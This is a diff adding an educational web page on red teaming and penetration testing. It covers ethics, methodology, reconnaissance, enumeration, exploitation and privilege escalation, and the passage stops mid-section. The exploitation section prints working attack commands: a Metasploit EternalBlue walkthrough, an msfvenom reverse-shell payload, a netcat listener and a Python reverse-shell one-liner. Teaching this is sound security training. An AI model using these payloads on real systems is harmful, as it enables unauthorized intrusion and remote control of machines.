+      </div>
+      <button class="mark-btn" id="markBtn" onclick="completeCourse()">✓ Mark Complete</button>
+    </div>
+  </div>
+
+  <div class="content">
+
+    <!-- HERO -->
+    <div class="page-hero">
+      <div class="hero-tag">🔴 Red Team · Offensive Security</div>
+      <h1>⚔️ Red Team &amp; Penetration Testing</h1>
+      <p>Learn to think and operate like an attacker — ethically. Master the full penetration testing lifecycle from reconnaissance to reporting, the tools professionals use, and how to legally break into systems to make them stronger.</p>
+      <div class="hero-meta">
+        <div class="hm-chip"><div class="dot" style="background:var(--accent);box-shadow:0 0 5px var(--accent)"></div>20 Sections</div>
+        <div class="hm-chip"><div class="dot" style="background:var(--warning);box-shadow:0 0 5px var(--warning)"></div>~75 min read</div>
+        <div class="hm-chip"><div class="dot" style="background:#ff8000;box-shadow:0 0 5px #ff8000"></div>Intermediate–Advanced</div>
+        <div class="hm-chip"><div class="dot" style="background:var(--purple);box-shadow:0 0 5px var(--purple)"></div>+250 XP on pass</div>
+      </div>
+    </div>
+
+
+    <!-- S1: WHAT IS RED TEAM -->
+    <div class="lab-section" id="s1">
+      <div class="s-head"><span class="s-num">01</span><h2>What is the Red Team?</h2><span class="s-badge sb-red">Foundation</span></div>
+
+      <p>The <strong>Red Team</strong> represents the offensive side of cybersecurity. Red teamers are ethical hackers who are <em>paid and authorized</em> to break into systems, networks, and buildings using the same techniques as real attackers — but with written permission and a clearly defined scope.</p>
+
+      <div class="info-box"><strong>🎯 Core Purpose:</strong> "If we don't find our own weaknesses first, a real attacker will." Red teams simulate real-world adversaries to expose gaps in security before malicious actors exploit them.</div>
+
+      <div class="diagram-container">
+        <div class="diagram-title">Red Team vs Penetration Testing vs Vulnerability Assessment</div>
+        <svg width="100%" viewBox="0 0 700 200" xmlns="http://www.w3.org/2000/svg">
+          <defs><marker id="ra1" markerWidth="7" markerHeight="7" refX="5" refY="3.5" orient="auto"><path d="M1 1L6 3.5L1 6" fill="none" stroke="#4a3030" stroke-width="1.5"/></marker></defs>
+          <!-- VA -->
+          <rect x="10" y="50" width="180" height="100" rx="10" fill="rgba(34,197,94,.06)" stroke="rgba(34,197,94,.2)" stroke-width="1.5"/>
+          <text x="100" y="80" text-anchor="middle" fill="#22c55e" font-size="11" font-weight="600">Vulnerability Assessment</text>
+          <text x="100" y="98" text-anchor="middle" fill="#7a8fa8" font-size="10">Scan &amp; List Weaknesses</text>
+          <text x="100" y="114" text-anchor="middle" fill="#4a3030" font-size="9">Automated tools</text>
+          <text x="100" y="128" text-anchor="middle" fill="#4a3030" font-size="9">No exploitation</text>
+          <text x="100" y="142" text-anchor="middle" fill="#4a3030" font-size="9">Days → 1-2 weeks</text>
+          <!-- Pentest -->
+          <rect x="260" y="30" width="180" height="140" rx="10" fill="rgba(245,158,11,.06)" stroke="rgba(245,158,11,.2)" stroke-width="1.5"/>
+          <text x="350" y="60" text-anchor="middle" fill="#f59e0b" font-size="11" font-weight="600">Penetration Testing</text>
+          <text x="350" y="78" text-anchor="middle" fill="#7a8fa8" font-size="10">Find &amp; Exploit Weaknesses</text>
+          <text x="350" y="96" text-anchor="middle" fill="#4a3030" font-size="9">Manual + tools</text>
+          <text x="350" y="112" text-anchor="middle" fill="#4a3030" font-size="9">Controlled exploitation</text>
+          <text x="350" y="128" text-anchor="middle" fill="#4a3030" font-size="9">Defined scope &amp; time</text>
+          <text x="350" y="144" text-anchor="middle" fill="#4a3030" font-size="9">1-4 weeks</text>
+          <text x="350" y="158" text-anchor="middle" fill="#4a3030" font-size="9">Detailed findings report</text>
+          <!-- Red Team -->
+          <rect x="510" y="10" width="180" height="180" rx="10" fill="rgba(255,60,60,.06)" stroke="rgba(255,60,60,.2)" stroke-width="1.5"/>
+          <text x="600" y="38" text-anchor="middle" fill="#ff3c3c" font-size="11" font-weight="600">Red Team Exercise</text>
+          <text x="600" y="56" text-anchor="middle" fill="#7a8fa8" font-size="10">Full APT Simulation</text>
+          <text x="600" y="74" text-anchor="middle" fill="#4a3030" font-size="9">No time limit</text>
+          <text x="600" y="90" text-anchor="middle" fill="#4a3030" font-size="9">Physical + digital + social</text>
+          <text x="600" y="106" text-anchor="middle" fill="#4a3030" font-size="9">Blue team unaware</text>
+          <text x="600" y="122" text-anchor="middle" fill="#4a3030" font-size="9">Stealth &amp; persistence</text>
+          <text x="600" y="138" text-anchor="middle" fill="#4a3030" font-size="9">Weeks to months</text>
+          <text x="600" y="154" text-anchor="middle" fill="#4a3030" font-size="9">Attack + defense report</text>
+          <text x="600" y="170" text-anchor="middle" fill="#4a3030" font-size="9">Tests entire org response</text>
+          <!-- arrows -->
+          <line x1="190" y1="100" x2="255" y2="100" stroke="#4a3030" stroke-width="1.5" marker-end="url(#ra1)"/>
+          <line x1="440" y1="100" x2="505" y2="100" stroke="#4a3030" stroke-width="1.5" marker-end="url(#ra1)"/>
+          <text x="222" y="93" text-anchor="middle" fill="#4a3030" font-size="8">More</text>
+          <text x="472" y="93" text-anchor="middle" fill="#4a3030" font-size="8">More</text>
+        </svg>
+      </div>
+
+      <table>
+        <thead><tr><th>Aspect</th><th>🔴 Red Team</th><th>🔵 Blue Team</th></tr></thead>
+        <tbody>
+          <tr><td>Role</td><td>Attacker / Offender</td><td>Defender / Protector</td></tr>
+          <tr><td>Goal</td><td>Break in, expose weaknesses</td><td>Detect, respond, prevent</td></tr>
+          <tr><td>Mindset</td><td>Think like a hacker</td><td>Think like a defender</td></tr>
+          <tr><td>Tools</td><td>Nmap, Metasploit, Burp Suite, Mimikatz</td><td>SIEM, EDR, Firewall, IDS</td></tr>
+          <tr><td>Key Skills</td><td>Exploitation, PrivEsc, OSINT, Scripting</td><td>Log analysis, IR, Forensics</td></tr>
+          <tr><td>Entry Barrier</td><td>Higher — needs 2-3 yrs IT/security base</td><td>Lower — good entry-level role</td></tr>
+          <tr><td>Top Certs</td><td>OSCP, CEH, eJPT, PNPT</td><td>Security+, CySA+, BTL1</td></tr>
+        </tbody>
+      </table>
+
+      <div class="note-box"><strong>📌 Purple Team:</strong> When red team and blue team collaborate — sharing attack techniques in real time so defenders can improve detection simultaneously — it's called a <strong>Purple Team exercise</strong>. It's the most efficient way to improve an organization's overall security posture.</div>
+    </div>
+
+
+    <!-- S2: ETHICS & LEGAL -->
+    <div class="lab-section" id="s2">
+      <div class="s-head"><span class="s-num">02</span><h2>Ethics, Legality &amp; Rules of Engagement</h2><span class="s-badge sb-warn">⚠️ Critical</span></div>
+
+      <p><strong>This is the most important section on this page.</strong> Penetration testing without explicit written authorization is a criminal offense in virtually every country. There is zero grey area — if you don't have permission, it's illegal. Period.</p>
+
+      <div class="danger-box"><strong>🚨 The Golden Rule:</strong> Never test systems you don't own or don't have <em>explicit written permission</em> to test. Using these skills on unauthorized systems is illegal under laws like the Computer Fraud and Abuse Act (CFAA) in the US, the Computer Misuse Act in the UK, and the IT Act in India. Violations carry prison sentences of 5–20 years.</div>
+
+      <h3>Rules of Engagement (ROE)</h3>
+      <p>Before any authorized penetration test begins, the red team and client sign a <strong>Rules of Engagement</strong> document that defines exactly what's allowed. Think of it as the "terms and conditions" of the hack.</p>
+
+      <div class="flow-steps">
+        <div class="flow-step"><div class="fs-num">1</div><div class="fs-body"><h4>Scope Definition</h4><p>Which IP ranges, domains, applications, and systems are in-scope (can be tested) vs out-of-scope (strictly off-limits). Example: "Test 192.168.1.0/24 and app.corp.com — do NOT touch payroll.corp.com."</p></div></div>
+        <div class="flow-step"><div class="fs-num">2</div><div class="fs-body"><h4>Testing Window</h4><p>What hours and days testing is permitted. "Testing allowed Monday–Friday 9am–5pm only" prevents disruptions to live business operations.</p></div></div>
+        <div class="flow-step"><div class="fs-num">3</div><div class="fs-body"><h4>Allowed Techniques</h4><p>What attack types are permitted: social engineering, physical access, denial-of-service? Many clients exclude DoS attacks because they disrupt business.</p></div></div>
+        <div class="flow-step"><div class="fs-num">4</div><div class="fs-body"><h4>Emergency Contacts</h4><p>A 24/7 contact to call if something accidentally breaks or if a critical vulnerability is found that requires immediate action.</p></div></div>
+        <div class="flow-step"><div class="fs-num">5</div><div class="fs-body"><h4>Data Handling</h4><p>How to handle sensitive data discovered (credentials, PII, financial data). Most ROEs require immediate secure deletion after the engagement.</p></div></div>
+      </div>
+
+      <h3>Practicing Legally — Safe Environments</h3>
+      <ul>
+        <li><strong>TryHackMe</strong> — Guided rooms in isolated VPN environments. Best for beginners.</li>
+        <li><strong>Hack The Box (HTB)</strong> — CTF-style vulnerable machines. Industry standard.</li>
+        <li><strong>VulnHub</strong> — Free downloadable vulnerable VMs for offline practice.</li>
+        <li><strong>Your own home lab</strong> — VirtualBox + Kali Linux + Metasploitable/DVWA. 100% safe.</li>
+        <li><strong>Bug Bounty programs</strong> — HackerOne, Bugcrowd — companies pay you to find bugs legally.</li>
+      </ul>
+
+      <div class="success-box"><strong>✅ Safe Practice Stack:</strong> Download VirtualBox (free) → Create a Kali Linux VM (attacker) → Download Metasploitable 2 VM (intentionally vulnerable target) → Connect both to a host-only network → You now have a legal, isolated hacking lab. This is how every professional starts.</div>
+    </div>
+
+
+    <!-- S3: METHODOLOGY -->
+    <div class="lab-section" id="s3">
+      <div class="s-head"><span class="s-num">03</span><h2>Penetration Testing Methodology</h2><span class="s-badge sb-red">Framework</span></div>
+
+      <p>Professional penetration testers don't randomly hack things — they follow a structured methodology. The most widely used is based on <strong>PTES (Penetration Testing Execution Standard)</strong> combined with elements from <strong>OWASP</strong> and <strong>NIST SP 800-115</strong>.</p>
+
+      <div class="phase-grid">
+        <div class="phase-card ph-1"><div class="pc-icon">📋</div><div class="pc-num">Phase 01</div><div class="pc-name">Pre-Engagement</div><p>Define scope, sign contracts, set rules, establish goals</p></div>
+        <div class="phase-card ph-2"><div class="pc-icon">🔍</div><div class="pc-num">Phase 02</div><div class="pc-name">Reconnaissance</div><p>Gather intelligence about the target — passive &amp; active</p></div>
+        <div class="phase-card ph-3"><div class="pc-icon">🗺️</div><div class="pc-num">Phase 03</div><div class="pc-name">Enumeration</div><p>Map open ports, services, users, shares, version info</p></div>
+        <div class="phase-card ph-4"><div class="pc-icon">💥</div><div class="pc-num">Phase 04</div><div class="pc-name">Exploitation</div><p>Actively exploit vulnerabilities to gain access</p></div>
+        <div class="phase-card ph-5"><div class="pc-icon">⬆️</div><div class="pc-num">Phase 05</div><div class="pc-name">Post-Exploitation</div><p>PrivEsc, lateral movement, persistence, data access</p></div>
+        <div class="phase-card ph-6"><div class="pc-icon">🧹</div><div class="pc-num">Phase 06</div><div class="pc-name">Cleanup</div><p>Remove all tools, backdoors, and traces left behind</p></div>
+        <div class="phase-card ph-7"><div class="pc-icon">📄</div><div class="pc-num">Phase 07</div><div class="pc-name">Reporting</div><p>Document findings, severity ratings, remediation steps</p></div>
+      </div>
+
+      <div class="method-timeline">
+        <div class="mt-item">
+          <div class="mt-card">
+            <div class="mt-phase">Phase 01</div>
+            <div class="mt-title">Pre-Engagement — Define Everything First</div>
+            <div class="mt-desc">This phase happens before touching a single system. You meet the client, sign a Statement of Work (SOW) and Rules of Engagement (ROE), define what success looks like, identify out-of-scope systems, and set the testing window. A poorly scoped engagement is dangerous — you could accidentally test a third-party system.</div>
+            <div class="mt-tools"><span class="mt-tool">SOW document</span><span class="mt-tool">ROE agreement</span><span class="mt-tool">Threat modeling</span></div>
+          </div>
+        </div>
+        <div class="mt-item">
+          <div class="mt-card">
+            <div class="mt-phase">Phase 02</div>
+            <div class="mt-title">Reconnaissance — Know Your Target</div>
+            <div class="mt-desc"><strong>Passive recon:</strong> gather info without touching the target — Google Dorks, WHOIS, DNS records, LinkedIn profiling, Shodan, certificate transparency logs. <strong>Active recon:</strong> directly interact with target systems — DNS zone transfers, port scanning. The more intel gathered here, the more focused and effective the attack phase becomes.</div>
+            <div class="mt-tools"><span class="mt-tool">Shodan</span><span class="mt-tool">theHarvester</span><span class="mt-tool">Maltego</span><span class="mt-tool">WHOIS</span><span class="mt-tool">Google Dorks</span><span class="mt-tool">Recon-ng</span></div>
+          </div>
+        </div>
+        <div class="mt-item">
+          <div class="mt-card">
+            <div class="mt-phase">Phase 03</div>
+            <div class="mt-title">Enumeration — Map the Attack Surface</div>
+            <div class="mt-desc">Now you interact directly with systems to find open ports, running services, software versions, user accounts, network shares, and more. This phase answers: "What exactly is running here, and what version is it?" Version numbers map directly to known CVEs (vulnerabilities).</div>
+            <div class="mt-tools"><span class="mt-tool">Nmap</span><span class="mt-tool">Gobuster</span><span class="mt-tool">Enum4linux</span><span class="mt-tool">Nikto</span><span class="mt-tool">ffuf</span><span class="mt-tool">SMBclient</span></div>
+          </div>
+        </div>
+        <div class="mt-item">
+          <div class="mt-card">
+            <div class="mt-phase">Phase 04</div>
+            <div class="mt-title">Exploitation — Get In</div>
+            <div class="mt-desc">Using discovered vulnerabilities to gain unauthorized access. This could be exploiting an unpatched CVE with Metasploit, cracking weak credentials, exploiting a SQL injection, or sending a phishing email with a malicious payload. The goal is a foothold — even the lowest-privilege access is enough to start with.</div>
+            <div class="mt-tools"><span class="mt-tool">Metasploit</span><span class="mt-tool">SQLmap</span><span class="mt-tool">Hydra</span><span class="mt-tool">Burp Suite</span><span class="mt-tool">MSFvenom</span></div>
+          </div>
+        </div>
+        <div class="mt-item">
+          <div class="mt-card">
+            <div class="mt-phase">Phase 05</div>
+            <div class="mt-title">Post-Exploitation — Go Deeper</div>
+            <div class="mt-desc">You're in — now escalate privileges, pivot to other machines, establish persistence, dump credentials, and map the internal network. The goal is to demonstrate the maximum realistic impact of the breach: "Could an attacker reach your domain controller? Your backup systems? Your customer database?"</div>
+            <div class="mt-tools"><span class="mt-tool">Mimikatz</span><span class="mt-tool">BloodHound</span><span class="mt-tool">LinPEAS</span><span class="mt-tool">WinPEAS</span><span class="mt-tool">Cobalt Strike</span><span class="mt-tool">Evil-WinRM</span></div>
+          </div>
+        </div>
+        <div class="mt-item">
+          <div class="mt-card">
+            <div class="mt-phase">Phase 06–07</div>
+            <div class="mt-title">Cleanup &amp; Reporting — Leave No Trace, Leave Everything Documented</div>
+            <div class="mt-desc">Remove every backdoor, shell, script, and tool you planted. Then write a comprehensive report with: Executive Summary (for management), Technical Findings (for IT teams), CVSS severity scores, proof-of-concept screenshots, and step-by-step remediation guidance. The report IS the deliverable.</div>
+            <div class="mt-tools"><span class="mt-tool">Dradis</span><span class="mt-tool">Plextrac</span><span class="mt-tool">CVSS calculator</span><span class="mt-tool">Custom templates</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+
+    <!-- S4: RECON SIMULATOR -->
+    <div class="lab-section" id="s4">
+      <div class="s-head"><span class="s-num">04</span><h2>🧪 Interactive: Reconnaissance Simulator</h2><span class="s-badge sb-warn">Hands-On Lab</span></div>
+
+      <p>Simulate running real reconnaissance commands against a fictional target company <strong>"Corp-Target Inc."</strong> — safely, in your browser. Select a recon type and a target, then run it to see realistic output.</p>
+
+      <div class="recon-sim">
+        <div class="recon-hdr"><div class="r-dot"></div><span>RECON TERMINAL — KALI LINUX</span><span style="margin-left:auto;color:#4a3030;">TARGET: corp-target.com</span></div>
+        <div class="recon-input-row">
+          <select class="recon-select" id="reconType">
+            <option value="nmap_basic">Nmap — Basic Port Scan</option>
+            <option value="nmap_svc">Nmap — Service Version Detection</option>
+            <option value="gobuster">Gobuster — Directory Brute Force</option>
+            <option value="whois">WHOIS — Domain Lookup</option>
+            <option value="theHarvester">theHarvester — Email/Sub Recon</option>
+            <option value="shodan">Shodan — Internet Exposure</option>
+            <option value="nikto">Nikto — Web Server Scan</option>
+            <option value="enum4linux">Enum4linux — SMB Enumeration</option>
+          </select>
+          <input class="recon-input" id="reconTarget" value="corp-target.com" placeholder="Target IP or domain...">
+          <button class="recon-run" onclick="runRecon()">▶ RUN</button>
+        </div>
+        <div class="recon-output" id="reconOutput">
+          <span class="ro-info">Select a recon type and click RUN to simulate the command...</span>
+        </div>
+      </div>
+
+      <div class="info-box"><strong>⚠️ Educational Simulation:</strong> All output above is simulated for learning. These are real tools used by professional pentesters — but in this module, they run against fictional data only. Practice on TryHackMe or your own home lab with real tools.</div>
+    </div>
+
+
+    <!-- S5: ENUMERATION -->
+    <div class="lab-section" id="s5">
+      <div class="s-head"><span class="s-num">05</span><h2>Enumeration — Mapping the Attack Surface</h2><span class="s-badge sb-red">Core Skill</span></div>
+
+      <p>Enumeration is the art of squeezing every possible detail out of a target's systems. After knowing <em>what</em> is running (recon), enumeration tells you <em>exactly how it's configured</em> — which is where vulnerabilities live.</p>
+
+      <div class="info-box"><strong>💡 The Hacker's Mindset:</strong> "Version number = CVE lookup." If you find Apache 2.4.49 running on a web server, you immediately search <code>Apache 2.4.49 CVE</code> — and you'd find CVE-2021-41773, a critical path traversal vulnerability. This is exactly how real attacks start.</div>
+
+      <h3>Nmap — The King of Port Scanners</h3>
+      <p>Nmap is the first tool nearly every pentester runs. It discovers what ports are open and what services are listening.</p>
+
+      <pre><span class="c"># Basic scan — find open ports</span>
+<span class="k">nmap</span> 192.168.1.1
+
+<span class="c"># Aggressive scan — OS, version, scripts, traceroute</span>
+<span class="k">nmap</span> -A -T4 192.168.1.1
+
+<span class="c"># Scan all 65535 ports (full scan)</span>
+<span class="k">nmap</span> -p- 192.168.1.1
+
+<span class="c"># Service version detection + default scripts</span>
+<span class="k">nmap</span> -sV -sC 192.168.1.1
+
+<span class="c"># Scan entire subnet</span>
+<span class="k">nmap</span> -sn 192.168.1.0/24
+
+<span class="c"># Save output to file (for report)</span>
+<span class="k">nmap</span> -A -oN scan_results.txt 192.168.1.1</pre>
+
+      <h3>Web Enumeration — Finding Hidden Pages</h3>
+      <p>Websites have directories and files that aren't linked publicly but still exist. Brute-force tools find them using wordlists.</p>
+
+      <pre><span class="c"># Gobuster — Find hidden directories</span>
+<span class="k">gobuster</span> dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+<span class="c"># ffuf — Faster fuzzer, finds files &amp; directories</span>
+<span class="k">ffuf</span> -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+
+<span class="c"># Found: /admin, /backup, /config.php, /.git — all gold!</span></pre>
+
+      <h3>SMB Enumeration (Windows Networks)</h3>
+      <p>SMB (Server Message Block) is used by Windows for file sharing. Misconfigurations here are a goldmine for attackers.</p>
+      <pre><span class="c"># Check for null sessions and shared drives</span>
+<span class="k">enum4linux</span> -a 192.168.1.10
+
+<span class="c"># List SMB shares manually</span>
+<span class="k">smbclient</span> -L //192.168.1.10 -N
+
+<span class="c"># Check for EternalBlue (MS17-010 — WannaCry vulnerability)</span>
+<span class="k">nmap</span> --script smb-vuln-ms17-010 192.168.1.10</pre>
+
+      <h3>Common Enumeration Checklist</h3>
+      <table>
+        <thead><tr><th>Port</th><th>Service</th><th>What to Check</th></tr></thead>
+        <tbody>
+          <tr><td><code>21</code></td><td>FTP</td><td>Anonymous login allowed? Version exploit?</td></tr>
+          <tr><td><code>22</code></td><td>SSH</td><td>Weak credentials? Old version (CVE)?</td></tr>
+          <tr><td><code>23</code></td><td>Telnet</td><td>Unencrypted credentials in transit</td></tr>
+          <tr><td><code>25</code></td><td>SMTP</td><td>Email user enumeration via VRFY/EXPN</td></tr>
+          <tr><td><code>80/443</code></td><td>HTTP/HTTPS</td><td>Hidden dirs, SQLi, XSS, file upload</td></tr>
+          <tr><td><code>139/445</code></td><td>SMB</td><td>EternalBlue, null sessions, weak share perms</td></tr>
+          <tr><td><code>3306</code></td><td>MySQL</td><td>Default credentials (root:), remote access?</td></tr>
+          <tr><td><code>3389</code></td><td>RDP</td><td>Brute force, BlueKeep (CVE-2019-0708)</td></tr>
+          <tr><td><code>5985</code></td><td>WinRM</td><td>Remote PowerShell — credentials = game over</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+
+    <!-- S6: VULNERABILITY ANALYSIS -->
+    <div class="lab-section" id="s6">
+      <div class="s-head"><span class="s-num">06</span><h2>Vulnerability Analysis — Finding What to Exploit</h2><span class="s-badge sb-warn">Analysis</span></div>
+
+      <p>After enumeration, you have a list of services and versions. Now you determine which ones have known vulnerabilities. This is where <strong>CVEs (Common Vulnerabilities and Exposures)</strong> and <strong>CVSS scores</strong> become your dictionary.</p>
+
+      <div class="info-box"><strong>💡 CVE Explained:</strong> A CVE is a unique identifier for a publicly known security vulnerability. Example: <code>CVE-2021-44228</code> is "Log4Shell" — a critical flaw in the Java logging library used by millions of apps. Every known vulnerability gets a CVE ID and a CVSS severity score.</div>
+
+      <h3>CVSS Severity Scoring</h3>
+      <p>CVSS (Common Vulnerability Scoring System) rates every vulnerability from 0–10:</p>
+      <table>
+        <thead><tr><th>Score</th><th>Severity</th><th>Color</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td>9.0–10.0</td><td>Critical</td><td style="color:var(--danger)">🔴 RED</td><td>Log4Shell, EternalBlue, Heartbleed</td></tr>
+          <tr><td>7.0–8.9</td><td>High</td><td style="color:#ff8c00">🟠 ORANGE</td><td>Apache Struts RCE, ProxyLogon</td></tr>
+          <tr><td>4.0–6.9</td><td>Medium</td><td style="color:var(--warning)">🟡 YELLOW</td><td>XSS, SSRF, information disclosure</td></tr>
+          <tr><td>0.1–3.9</td><td>Low</td><td style="color:var(--green)">🟢 GREEN</td><td>Banner disclosure, verbose errors</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Where to Find Exploits</h3>
+      <div class="tool-grid">
+        <div class="tool-card"><div class="tc-name">🔎 ExploitDB</div><div class="tc-desc">The world's largest public exploit database. Search by CVE, software name, or type. Every result includes ready-to-use exploit code.</div><span class="tc-tag">exploit-db.com</span></div>
+        <div class="tool-card"><div class="tc-name">🔐 NVD</div><div class="tc-desc">NIST National Vulnerability Database. Official source for CVE details, CVSS scores, and affected software versions.</div><span class="tc-tag">nvd.nist.gov</span></div>
+        <div class="tool-card"><div class="tc-name">⚡ Metasploit</div><div class="tc-desc">Search built-in exploit modules with <code>search</code> command. Pre-packaged, ready-to-run exploits for thousands of CVEs.</div><span class="tc-tag">msfconsole</span></div>
+        <div class="tool-card"><div class="tc-name">🐙 GitHub</div><div class="tc-desc">Search <code>CVE-XXXX PoC</code> — researchers often publish proof-of-concept exploits. Also use <code>searchsploit</code> locally.</div><span class="tc-tag">github.com</span></div>
+      </div>
+
+      <pre><span class="c"># searchsploit — search ExploitDB offline</span>
+<span class="k">searchsploit</span> apache 2.4.49
+
+<span class="c"># Output shows matching exploits:</span>
+<span class="g">Apache HTTP Server 2.4.49 - Path Traversal &amp; RCE | linux/remote/50383.sh</span>
+
+<span class="c"># Copy the exploit to current directory</span>
+<span class="k">searchsploit</span> -m linux/remote/50383.sh</pre>
+    </div>
+
+
+    <!-- S7: EXPLOITATION -->
+    <div class="lab-section" id="s7">
+      <div class="s-head"><span class="s-num">07</span><h2>Exploitation — Getting a Foothold</h2><span class="s-badge sb-red">⚠️ Core Technique</span></div>
+
+      <p>Exploitation is the phase where you actually leverage a vulnerability to gain access to the target. The goal is a <strong>shell</strong> — a command prompt running on the target machine. Even low-privilege access (like a web server's <code>www-data</code> user on Linux) is a starting point you can escalate from.</p>
+
+      <h3>Metasploit Framework — The Exploit Engine</h3>
+      <p>Metasploit is the most famous exploitation framework, used by pentesters worldwide. It packages exploits into easy-to-use modules.</p>
+
+      <pre><span class="c"># Start Metasploit console</span>
+<span class="k">msfconsole</span>
+
+<span class="c"># Search for EternalBlue exploit (MS17-010 — SMB vulnerability)</span>
+msf6 &gt; <span class="k">search</span> ms17-010
+
+<span class="c"># Select the exploit module</span>
+msf6 &gt; <span class="k">use</span> exploit/windows/smb/ms17_010_eternalblue
+
+<span class="c"># Set target IP</span>
+msf6 exploit(ms17_010_eternalblue) &gt; <span class="k">set</span> RHOSTS 192.168.1.50
+
+<span class="c"># Set your listener IP</span>
+msf6 exploit(ms17_010_eternalblue) &gt; <span class="k">set</span> LHOST 192.168.1.10
+
+<span class="c"># Run the exploit</span>
+msf6 exploit(ms17_010_eternalblue) &gt; <span class="k">run</span>
+
+<span class="c"># Success! You get a Meterpreter shell on the target</span>
+<span class="g">[*] Meterpreter session 1 opened (192.168.1.10:4444 -&gt; 192.168.1.50:49172)</span>
+meterpreter &gt; <span class="k">whoami</span>
+<span class="g">NT AUTHORITY\SYSTEM</span>   <span class="c"># Highest privilege — game over!</span></pre>
+
+      <h3>Types of Shells</h3>
+      <table>
+        <thead><tr><th>Shell Type</th><th>How It Works</th><th>When Used</th></tr></thead>
+        <tbody>
+          <tr><td>Bind Shell</td><td>Target opens a port and waits for attacker to connect</td><td>When attacker can reach target directly</td></tr>
+          <tr><td>Reverse Shell</td><td>Target connects back to attacker's listener</td><td>When target is behind firewall (most common)</td></tr>
+          <tr><td>Web Shell</td><td>PHP/ASPX file uploaded to web server for command execution</td><td>After file upload vulnerability exploitation</td></tr>
+          <tr><td>Meterpreter</td><td>Advanced memory-resident shell with full post-exploit toolkit</td><td>Metasploit engagements</td></tr>
+        </tbody>
+      </table>
+
+      <pre><span class="c"># Generate a reverse shell payload with MSFvenom</span>
+<span class="k">msfvenom</span> -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
+
+<span class="c"># Simple netcat listener to catch the shell</span>
+<span class="k">nc</span> -lvnp 4444
+
+<span class="c"># One-liner Python reverse shell (works on Linux)</span>
+python3 -c <span class="s">'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.10",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.run(["/bin/sh"])'</span></pre>
+
+      <div class="warning-box"><strong>⚠️ Always Clean Up:</strong> After an authorized pentest, remove every payload, listener, and backdoor you created. Leave the system exactly as you found it (except for your documented findings). Leaving tools behind is unprofessional and potentially dangerous.</div>
+    </div>
+
+
+    <!-- S8: EXPLOIT SCENARIO LAB -->
+    <div class="lab-section" id="s8">
+      <div class="s-head"><span class="s-num">08</span><h2>🧪 Exploit Scenario Decision Lab</h2><span class="s-badge sb-warn">Interactive</span></div>
+
+      <p>You're a pentester on an authorized engagement. Read each scenario and choose the best next action. This tests your understanding of methodology and judgment.</p>
+
+      <div class="exploit-quiz">
+        <div class="eq-title">⚔️ Pentester Decision Lab <span class="eq-score">Score: <span id="eqScore">0</span>/5</span></div>
+
+        <div id="eqCard">
+          <div class="eq-q" id="eqQ"></div>
+          <div class="eq-opts" id="eqOpts"></div>
+          <div class="eq-exp" id="eqExp"></div>
+          <button class="eq-next" id="eqNext" onclick="nextEQ()">Next Scenario →</button>
+        </div>
+      </div>
+    </div>
+
+
+    <!-- S9: PRIVILEGE ESCALATION -->
+    <div class="lab-section" id="s9">
+      <div class="s-head"><span class="s-num">09</span><h2>Privilege Escalation — From User to Root/SYSTEM</h2><span class="s-badge sb-red">Post-Exploit</span></div>
+
+      <p>You've gained a shell — but you're a low-privileged user. Privilege escalation (PrivEsc) is the process of moving from <code>www-data</code> or a standard user to <code>root</code> (Linux) or <code>NT AUTHORITY\SYSTEM</code> (Windows). This gives you complete control over the machine.</p>
+
+      <div class="diagram-container">
+        <div class="diagram-title">The Privilege Escalation Ladder</div>
+        <svg width="100%" viewBox="0 0 700 180" xmlns="http://www.w3.org/2000/svg">
+          <!-- Levels from bottom to top -->
+          <rect x="10" y="130" width="680" height="36" rx="8" fill="rgba(139,92,246,.07)" stroke="rgba(139,92,246,.18)" stroke-width="1.5"/>
+          <text x="350" y="153" text-anchor="middle" fill="#8b5cf6" font-size="11" font-weight="600">INITIAL FOOTHOLD — Low Privilege User (www-data, guest, nobody)</text>
+          <line x1="350" y1="128" x2="350" y2="108" stroke="#4a3030" stroke-width="1.5" stroke-dasharray="4,3"/>
+          <rect x="10" y="72" width="680" height="34" rx="8" fill="rgba(245,158,11,.07)" stroke="rgba(245,158,11,.18)" stroke-width="1.5"/>
+          <text x="350" y="94" text-anchor="middle" fill="#f59e0b" font-size="11" font-weight="600">STANDARD USER — Normal user account, limited permissions</text>
+          <line x1="350" y1="70" x2="350" y2="50" stroke="#4a3030" stroke-width="1.5" stroke-dasharray="4,3"/>
+          <rect x="10" y="14" width="680" height="34" rx="8" fill="rgba(255,60,60,.12)" stroke="rgba(255,60,60,.3)" stroke-width="1.5"/>
+          <text x="350" y="36" text-anchor="middle" fill="#ff3c3c" font-size="12" font-weight="700">🔴 ROOT (Linux) / NT AUTHORITY\SYSTEM (Windows) — TOTAL CONTROL</text>
+          <text x="20" y="52" fill="#4a3030" font-size="9">PrivEsc techniques</text>
+          <text x="20" y="110" fill="#4a3030" font-size="9">PrivEsc techniques</text>
+        </svg>
+      </div>
+
+      <div class="privesc-grid">
+        <div class="privesc-card pc-linux">
+          <h4>🐧 Linux Privilege Escalation</h4>
+          <ul>
+            <li>SUID binaries abuse (find / -perm -4000)</li>
+            <li>Sudo misconfigurations (sudo -l)</li>
+            <li>Writable cron jobs running as root</li>
+            <li>Kernel exploits (DirtyCow, Sudo Baron)</li>
+            <li>Weak file permissions on /etc/passwd</li>
+            <li>PATH environment variable injection</li>
+            <li>NFS misconfiguration (no_root_squash)</li>
+            <li>Writable service scripts / start-up files</li>
+          </ul>
+        </div>
+        <div class="privesc-card pc-win">
+          <h4>🪟 Windows Privilege Escalation</h4>
+          <ul>
+            <li>AlwaysInstallElevated (MSI exploit)</li>
+            <li>Unquoted service paths</li>
+            <li>Weak service permissions (replace binary)</li>
+            <li>Token impersonation (PrintSpoofer, Potato)</li>
+            <li>UAC bypass techniques</li>
+            <li>DLL hijacking</li>
+            <li>Registry AutoRun abuse</li>
+            <li>Credential harvesting from memory (Mimikatz)</li>
+          </ul>
+        </div>
+      </div>
+
+      <h3>Automated PrivEsc Enumeration Scripts</h3>
+      <pre><span class="c"># Linux — LinPEAS (most popular, runs automated checks)</span>
